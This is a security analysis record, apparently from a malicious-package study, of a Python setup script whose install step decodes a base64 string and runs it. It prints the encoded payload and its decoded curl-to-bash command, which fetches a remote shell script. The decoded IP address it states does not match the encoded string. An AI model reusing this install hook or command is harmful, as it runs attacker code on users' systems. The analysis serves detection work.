  "purpose": "Define setup configuration for a Python package with an intentionally malicious behavior during installation.",
  "sources": "The base64-encoded string in the notmalfunc() function, which is decoded and executed via os.system.",
  "sinks": "The os.system() call executing decoded code from the base64 string, which can lead to remote code execution.",
  "flows": "The base64 string is decoded in b64d(), then passed to os.system() in notmalfunc(), executing remote code upon package installation.",
  "anomalies": "Use of base64 decoding followed by os.system() to run code from an external source; the URL points to an IP address and path indicating remote code execution.",
  "analysis": "The code imports setuptools and related commands, then defines a base64 decoding function. The notmalfunc() decodes a base64 string that appears to execute a curl command to an external URL. During the 'install' process, notmalfunc() is called, leading to execution of potentially malicious remote code. The setup script defines standard package metadata but includes a backdoor in the install step. The base64 string 'Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Jldi5zaCB8IGJhc2gK' decodes to 'curl -s http://192.168.1.3:8000/rev.sh | bash', indicating the code fetches and executes a remote script, which is a common malicious pattern.",
  "conclusion": "The code contains a malicious backdoor that executes remote code during installation by decoding a base64 string and running it with os.system(). This behavior is typical of supply chain attacks aiming to run arbitrary code on user systems.",
